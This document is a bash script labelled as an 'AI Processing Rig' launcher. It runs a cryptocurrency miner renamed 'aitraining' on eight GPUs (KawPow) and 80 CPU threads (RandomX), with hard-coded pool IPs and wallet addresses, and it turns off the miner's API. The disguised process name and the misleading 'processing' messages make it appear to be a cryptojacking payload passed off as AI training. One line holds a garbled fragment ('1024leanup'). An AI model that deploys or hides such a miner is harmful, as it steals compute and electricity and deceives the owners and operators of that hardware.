#!/bin/bash

export GPU_MAX_HEAP_SIZE=100
export GPU_MAX_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=100
export GPU_MAX_ALLOC_PERCENT=100
export GPU_MAX_SINGLE_ALLOC_PERCENT=100
export GPU_ENABLE_LARGE_ALLOCATION=100
export GPU_MAX_WORKGROUP_SIZE=1024leanup
LOG_FILE=$(mktemp --suffix=.log)

echo "=== Initializing AI Processing Rig with 8x H200 ===" | tee -a "$LOG_FILE"

# --- STOP OLD PROCESSES ---
echo "$(date) Stopping old 'aitraining' and 'monitor_system' processes..." | tee -a "$LOG_FILE"
sudo pkill -f aitraining 2>/dev/null
sudo pkill -f monitor_system 2>/dev/null
sleep 2

# --- GPU PROCESS (KawPow) ---
echo -e "\n$(date) Starting GPU (KawPow) Process..." | tee -a "$LOG_FILE"
sudo ./aitraining \
    --algorithm kawpow \
    --pool 74.220.25.74:7845 \
    --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
    --worker H200-rig \
    --password x \
    --gpu-id 0,1,2,3,4,5,6,7 \
    --disable-cpu \
    --tls false \
    --keepalive true \
    --log-file "$LOG_FILE" \
    --log-file-mode 1 \
    --extended-log \
    --enable-restart-on-rejected \
    --max-rejected-shares 10 \
    --max-no-share-sent 300 \
    --gpu-progpow-safe \
    --api-disable &

# --- CPU PROCESS (RandomX) ---
echo -e "\n$(date) Starting CPU (RandomX) Process..." | tee -a "$LOG_FILE"
sudo ./aitraining \
    --algorithm randomx \
    --pool 51.222.200.133:10343 \
    --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
    --worker H200-cpu \
    --password x \
    --cpu-threads 80 \
    --disable-gpu \
    --tls true \
    --log-file "$LOG_FILE" \
    --log-file-mode 1 \
    --api-disable &

# --- MONITOR SYSTEM ---
echo -e "\n$(date) Starting System Monitor (PID: $$)..." | tee -a "$LOG_FILE"
bash -c "
while true; do
    echo -e '\n=== \$(date) System Status ==='
    echo 'Active Processes (GPU/CPU Miners):'
    ps aux | grep aitraining | grep -v grep
    echo 'GPU Status (Index, Temp, Util, Mem Used, Power):'
    nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>/dev/null
    echo '---'
    sleep 30
done
" >> "$LOG_FILE" 2>&1 &


echo -e "\n$(date) === Processing Started Successfully ===" | tee -a "$LOG_FILE"
echo ""
echo "✅ All logs are directed to a single temporary file."
echo "📄 Log File Path: $LOG_FILE"
echo ""
echo "🌐 API Endpoints:"
echo "   GPU Stats (KawPow): DISABLED"
echo "   CPU Stats (RandomX): http://127.0.0.1:21551/stats"
echo ""
echo "🔍 Real-time logs: tail -f $LOG_FILE"
echo "🛑 Stop processing: sudo pkill -f aitraining && sudo pkill -f monitor_system"
